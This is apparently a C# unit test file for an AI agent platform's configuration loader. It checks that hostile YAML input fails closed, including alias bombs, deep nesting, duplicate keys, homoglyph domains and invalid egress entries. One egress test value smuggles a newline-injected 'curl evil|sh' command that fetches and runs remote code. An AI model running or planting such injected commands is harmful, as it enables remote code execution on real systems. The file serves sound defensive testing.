using Capybara.Contracts.Agents;
using Capybara.Orchestration.Configuration;
using Capybara.Testing;

namespace Capybara.Orchestration.Tests;

public sealed class CapybaraConfigurationLoaderTests
{
    [Fact]
    public void Sample_config_is_valid()
    {
        var config = CapybaraConfigurationLoader.Load(RepositoryPaths.SampleConfig);

        Assert.Equal(["code", "ea", "research"], config.Agents.Select(a => a.Id.Value).Order(StringComparer.Ordinal));
        Assert.NotEmpty(config.Rules);
        Assert.Contains(config.Routines, r => r.Id == "ea-heartbeat");

        var ea = config.Agents.Single(a => a.Id == AgentId.Parse("ea"));
        Assert.DoesNotContain("web_fetch", ea.Tools);
        Assert.Contains("email_send", ea.ApprovalRequiredTools);
        Assert.False(string.IsNullOrWhiteSpace(ea.Soul));

        var research = config.Agents.Single(a => a.Id == AgentId.Parse("research"));
        Assert.Empty(research.Grants);
        Assert.False(research.ReadsUserMemory);
    }

    [Fact]
    public void The_memory_stewards_id_cannot_be_an_agent()
    {
        using var dir = new TempDirectory();
        var agentDir = Directory.CreateDirectory(Path.Combine(dir.Path, "agents", "steward")).FullName;
        File.WriteAllText(Path.Combine(agentDir, "agent.yaml"), "id: steward\nname: Steward\njob: tidies memory\n");

        var ex = Assert.Throws<CapybaraConfigurationException>(() => CapybaraConfigurationLoader.Load(dir.Path));

        Assert.Contains(ex.Errors, e => e.Contains("reserved", StringComparison.Ordinal));
    }

    [Theory]
    [InlineData("1e300m")]
    [InlineData("NaNm")]
    [InlineData("Infinityd")]
    [InlineData("-Infinityh")]
    public void Out_of_range_intervals_fail_closed(string every)
    {
        using var dir = new TempDirectory();
        var agentDir = Directory.CreateDirectory(Path.Combine(dir.Path, "agents", "ea")).FullName;
        File.WriteAllText(Path.Combine(agentDir, "agent.yaml"), "id: ea\nname: EA\njob: assistant\n");
        File.WriteAllText(Path.Combine(dir.Path, "routines.yaml"), $"- id: r\n  owner: ea\n  kind: heartbeat\n  every: {every}\n  prompt: hi\n");

        var ex = Assert.Throws<CapybaraConfigurationException>(() => CapybaraConfigurationLoader.Load(dir.Path));

        Assert.Contains(ex.Errors, e => e.Contains("cannot parse interval", StringComparison.Ordinal));
    }

    [Theory]
    [InlineData("agents/ea/agent.yaml", "id: ea\nname: EA\njob: assistant\nx:\n {0}")]
    [InlineData("routines.yaml", "{0}")]
    [InlineData("rules.yaml", "{0}")]
    public void Deep_nesting_fails_closed_instead_of_overflowing_the_stack(string file, string template)
    {
        var flow = new string('[', 10_000) + new string(']', 10_000);
        var block = string.Concat(Enumerable.Repeat("- ", 10_000)) + "a";
        foreach (var deep in new[] { flow, block })
        {
            using var dir = new TempDirectory();
            Directory.CreateDirectory(Path.Combine(dir.Path, "agents", "ea"));
            File.WriteAllText(Path.Combine(dir.Path, "agents", "ea", "agent.yaml"), "id: ea\nname: EA\njob: assistant\n");
            File.WriteAllText(Path.Combine(dir.Path, file), string.Format(System.Globalization.CultureInfo.InvariantCulture, template, deep));

            var ex = Assert.Throws<CapybaraConfigurationException>(() => CapybaraConfigurationLoader.Load(dir.Path));

            Assert.Contains(ex.Errors, e => e.Contains("nested deeper than", StringComparison.Ordinal));
        }
    }

    [Fact]
    public void Deeply_nested_skill_frontmatter_is_skipped_not_fatal()
    {
        using var dir = new TempDirectory();
        var skill = Directory.CreateDirectory(Path.Combine(dir.Path, "agents", "ea", "skills", "deep")).FullName;
        File.WriteAllText(Path.Combine(dir.Path, "agents", "ea", "agent.yaml"), "id: ea\nname: EA\njob: assistant\n");
        File.WriteAllText(Path.Combine(skill, "SKILL.md"), "---\nname: deep\nx: " + new string('[', 10_000) + new string(']', 10_000) + "\n---\nBody.\n");

        var config = CapybaraConfigurationLoader.Load(dir.Path);

        Assert.Empty(Assert.Single(config.Agents).Skills);
    }

    [Fact]
    public void Self_referential_skill_frontmatter_is_skipped_not_fatal()
    {
        // `&a [*a]` is a list containing itself; walking it recursed until the stack overflowed.
        using var dir = new TempDirectory();
        var skill = Directory.CreateDirectory(Path.Combine(dir.Path, "agents", "ea", "skills", "loop")).FullName;
        File.WriteAllText(Path.Combine(dir.Path, "agents", "ea", "agent.yaml"), "id: ea\nname: EA\njob: assistant\n");
        File.WriteAllText(Path.Combine(skill, "SKILL.md"), "---\nname: loop\ndescription: Loops.\nallowed-tools: &a [*a]\n---\nBody.\n");

        var config = CapybaraConfigurationLoader.Load(dir.Path);

        Assert.Empty(Assert.Single(config.Agents).Skills);
    }

    [Fact]
    public void Alias_bomb_skill_frontmatter_is_skipped_quickly()
    {
        using var dir = new TempDirectory();
        var skill = Directory.CreateDirectory(Path.Combine(dir.Path, "agents", "ea", "skills", "bomb")).FullName;
        File.WriteAllText(Path.Combine(dir.Path, "agents", "ea", "agent.yaml"), "id: ea\nname: EA\njob: assistant\n");
        File.WriteAllText(Path.Combine(skill, "SKILL.md"), "---\nname: bomb\ndescription: Bomb.\n" + AliasBomb("allowed-tools") + "---\nBody.\n");

        var started = System.Diagnostics.Stopwatch.StartNew();
        var config = CapybaraConfigurationLoader.Load(dir.Path);

        Assert.Empty(Assert.Single(config.Agents).Skills);
        Assert.True(started.Elapsed < TimeSpan.FromSeconds(2), $"took {started.Elapsed}");
    }

    [Fact]
    public void Skill_frontmatter_with_a_harmless_anchor_is_rejected_like_the_proposal_path_does()
    {
        Assert.False(SkillCardReader.TryReadFrontmatter("---\nname: a\ndescription: &d text\n---\nBody\n", out _));
        Assert.True(SkillCardReader.TryReadFrontmatter("---\nname: a\ndescription: text\n---\nBody\n", out var plain));
        Assert.Equal("a", plain.Name);
    }

    [Fact]
    public void Null_scan_terminates_on_a_cyclic_graph()
    {
        var loop = new List<object?>();
        loop.Add(loop);
        loop.Add(null);

        var found = YamlNulls.Find(loop);

        Assert.Equal(["[1]"], found);
    }

    [Fact]
    public void Null_scan_visits_shared_objects_once_instead_of_expanding_them()
    {
        // Eight levels, each holding ten references to the one below: 10^8 paths if every alias were expanded.
        List<object?> level = [null];
        for (var i = 0; i < 8; i++)
        {
            level = [.. Enumerable.Repeat<object?>(level, 10)];
        }

        var found = YamlNulls.Find(level);

        Assert.Single(found);
    }

    [Fact]
    public void Null_scan_stops_at_the_depth_cap()
    {
        object? node = new List<object?> { null };
        for (var i = 0; i < YamlEditor.MaxDepth * 4; i++)
        {
            node = new List<object?> { node };
        }

        Assert.Empty(YamlNulls.Find(node!));
    }

    private static string AliasBomb(string key)
    {
        var yaml = new System.Text.StringBuilder("l0: &l0 [x]\n");
        for (var i = 1; i < 8; i++)
        {
            yaml.Append(System.Globalization.CultureInfo.InvariantCulture, $"l{i}: &l{i} [{string.Join(", ", Enumerable.Repeat($"*l{i - 1}", 10))}]\n");
        }

        return yaml.Append(System.Globalization.CultureInfo.InvariantCulture, $"{key}: *l7\n").ToString();
    }

    [Theory]
    [InlineData("agents/ea/agent.yaml", "id: ea\nname: EA\njob: assistant\ntools: ~\n", "tools")]
    [InlineData("agents/ea/agent.yaml", "id: ea\nname: EA\njob: assistant\ngrants: [~]\n", "grants[0]")]
    [InlineData("agents/ea/agent.yaml", "id: ea\nname: EA\njob: assistant\ngrants: [{connection: c, constraints: {to: [a, ~]}}]\n", "grants[0].constraints.to[1]")]
    [InlineData("routines.yaml", "- ~\n", "[0]")]
    [InlineData("routines.yaml", "- id: r\n  owner: ea\n  kind: heartbeat\n  every: 1h\n  prompt: hi\n  approvalBoundary: ~\n", "[0].approvalBoundary")]
    [InlineData("rules.yaml", "- ~\n", "[0]")]
    [InlineData("rules.yaml", "- effect: allow\n  tool: x\n  destinationAllowlist: [~]\n", "[0].destinationAllowlist[0]")]
    public void Yaml_nulls_fail_closed_with_their_path(string file, string content, string path)
    {
        using var dir = new TempDirectory();
        Directory.CreateDirectory(Path.Combine(dir.Path, "agents", "ea"));
        File.WriteAllText(Path.Combine(dir.Path, "agents", "ea", "agent.yaml"), "id: ea\nname: EA\njob: assistant\n");
        File.WriteAllText(Path.Combine(dir.Path, file), content);

        var ex = Assert.Throws<CapybaraConfigurationException>(() => CapybaraConfigurationLoader.Load(dir.Path));

        Assert.Contains(ex.Errors, e => e.Contains($"'{path}' is null", StringComparison.Ordinal));
    }

    [Theory]
    [InlineData("hidden: ~")]
    [InlineData("budget: ~")]
    [InlineData("budget: {dailyCredits: ~}")]
    [InlineData("provider: ~")]
    [InlineData("trifecta: {untrustedInput: ~}")]
    [InlineData("accepts: {consults: ~}")]
    [InlineData("notifications: ~")]
    [InlineData("grants: [{connection: ~}]")]
    [InlineData("grants: [{connection: c, constraints: {~: [a]}}]")]
    [InlineData("mcpServers: [{name: m, type: stdio, command: ~, timeout: ~, args: [~]}]")]
    [InlineData("provider: {type: ~, baseUrl: ~}")]
    [InlineData("~: x")]
    public void Any_null_in_agent_yaml_loads_or_fails_closed(string field)
    {
        using var dir = new TempDirectory();
        Directory.CreateDirectory(Path.Combine(dir.Path, "agents", "ea"));
        File.WriteAllText(Path.Combine(dir.Path, "agents", "ea", "agent.yaml"), "id: ea\nname: EA\njob: assistant\n" + field + "\n");

        var ex = Record.Exception(() => CapybaraConfigurationLoader.Load(dir.Path));

        Assert.True(ex is null or CapybaraConfigurationException, ex?.ToString());
    }

    [Fact]
    public void Invalid_config_fails_closed_with_every_error()
    {
        using var dir = new TempDirectory();
        var agentDir = Directory.CreateDirectory(Path.Combine(dir.Path, "agents", "ea")).FullName;
        File.WriteAllText(Path.Combine(agentDir, "agent.yaml"), """
            id: not-ea
            name: EA
            job: assistant
            tools: [email_send]
            externalActionTools: [email_send]
            trifecta: { untrustedInput: true, privateData: true, externalAction: true }
            peers: { consult: [ghost] }
            """);
        File.WriteAllText(Path.Combine(dir.Path, "routines.yaml"), """
            - id: spam
              owner: ea
              kind: heartbeat
              every: 1m
              prompt: hi
            """);

        var ex = Assert.Throws<CapybaraConfigurationException>(() => CapybaraConfigurationLoader.Load(dir.Path));

        Assert.True(ex.Errors.Count >= 3, string.Join('\n', ex.Errors));
    }

    [Fact]
    public void Stdio_mcp_servers_must_pin_their_script_or_declare_self_contained()
    {
        using var dir = new TempDirectory();
        var command = Path.Combine(dir.Path, "server");
        var hash = new string('a', 64);

        string Agent(string extra) => $"""
            id: ea
            name: EA
            job: assistant
            tools: [list_agents]
            mcpServers:
              - name: local
                type: stdio
                command: '{command}'
                args: ['{Path.Combine(dir.Path, "server.js")}']
                tools: [search]
                sha256: {hash}
            {extra}
            """;

        var agentDir = Directory.CreateDirectory(Path.Combine(dir.Path, "agents", "ea")).FullName;
        File.WriteAllText(Path.Combine(agentDir, "agent.yaml"), Agent(string.Empty));
        var ex = Assert.Throws<CapybaraConfigurationException>(() => CapybaraConfigurationLoader.Load(dir.Path));
        Assert.Contains(ex.Errors, e => e.Contains("selfContained", StringComparison.Ordinal));

        File.WriteAllText(Path.Combine(agentDir, "agent.yaml"), Agent("    selfContained: true"));
        Assert.True(CapybaraConfigurationLoader.Load(dir.Path).Agents.Single().McpServers.Single().SelfContained);

        File.WriteAllText(Path.Combine(agentDir, "agent.yaml"), Agent($"    scriptSha256: {new string('B', 64)}"));
        Assert.Equal(new string('b', 64), CapybaraConfigurationLoader.Load(dir.Path).Agents.Single().McpServers.Single().ScriptSha256);

        // Both together would mean one of them is silently ignored, so the combination is rejected.
        File.WriteAllText(Path.Combine(agentDir, "agent.yaml"), Agent($"    scriptSha256: {new string('b', 64)}\n    selfContained: true"));
        var both = Assert.Throws<CapybaraConfigurationException>(() => CapybaraConfigurationLoader.Load(dir.Path));
        Assert.Contains(both.Errors, e => e.Contains("cannot both", StringComparison.Ordinal));
    }

    [Theory]
    [InlineData("api.github.com                                                  \nExecStartPre=/bin/sh -c 'curl evil|sh'")]
    [InlineData("any")]
    [InlineData("localhost")]
    [InlineData("api.g\u0456thub.com")]
    [InlineData("\u212Aelvin.com")]
    [InlineData("*.com")]
    [InlineData("a.*.com")]
    [InlineData("1.2.3.4")]
    [InlineData("10.0.0.0/8")]
    [InlineData("::1")]
    [InlineData("example.com:443")]
    [InlineData("-bad.example.com")]
    [InlineData("bad-.example.com")]
    [InlineData("a..example.com")]
    [InlineData("exa mple.com")]
    [InlineData(" example.com")]
    public void Invalid_egress_entries_fail_closed(string entry)
    {
        var ex = Assert.Throws<CapybaraConfigurationException>(() => LoadWithEgress(entry));

        Assert.Contains(ex.Errors, e => e.Contains("egress", StringComparison.Ordinal));
        Assert.DoesNotContain(ex.Errors, e => e.Contains('\n', StringComparison.Ordinal));
    }

    [Fact]
    public void Unrestricted_egress_must_stand_alone()
    {
        Assert.Throws<CapybaraConfigurationException>(() => LoadWithEgress("*", "example.com"));
        Assert.Equal(["*"], LoadWithEgress("*").Agents.Single().EgressDomains);
    }

    [Fact]
    public void Egress_hostnames_are_lower_cased_and_wildcards_need_two_labels()
    {
        var agent = LoadWithEgress("API.GitHub.com", "*.googleapis.com", "api.github.com").Agents.Single();

        Assert.Equal(["api.github.com", "*.googleapis.com"], agent.EgressDomains);
    }

    private static CapybaraConfiguration LoadWithEgress(params string[] entries)
    {
        using var dir = new TempDirectory();
        var agentDir = Directory.CreateDirectory(Path.Combine(dir.Path, "agents", "research")).FullName;
        var list = string.Join(", ", entries.Select(e => System.Text.Json.JsonSerializer.Serialize(e)));
        File.WriteAllText(Path.Combine(agentDir, "agent.yaml"), $"id: research\nname: Research\njob: Searches.\negress: [{list}]\n");
        return CapybaraConfigurationLoader.Load(dir.Path);
    }

    [Theory]
    [InlineData("grants: []\n!!str grants: [{connection: gmail, operations: [send]}]")]
    [InlineData("grants: []\n!foo grants: [{connection: gmail, operations: [send]}]")]
    [InlineData("grants: []\ngrants: [{connection: gmail, operations: [send]}]")]
    public void Duplicate_keys_fail_closed_even_when_tagged(string grants)
    {
        using var dir = new TempDirectory();
        var agentDir = Directory.CreateDirectory(Path.Combine(dir.Path, "agents", "ea")).FullName;
        File.WriteAllText(Path.Combine(agentDir, "agent.yaml"), "id: ea\nname: EA\njob: assistant\ntrifecta: { privateData: true }\n" + grants + "\n");

        var ex = Assert.Throws<CapybaraConfigurationException>(() => CapybaraConfigurationLoader.Load(dir.Path));

        Assert.Contains(ex.Errors, e => e.Contains("uplicate", StringComparison.OrdinalIgnoreCase));
    }
}
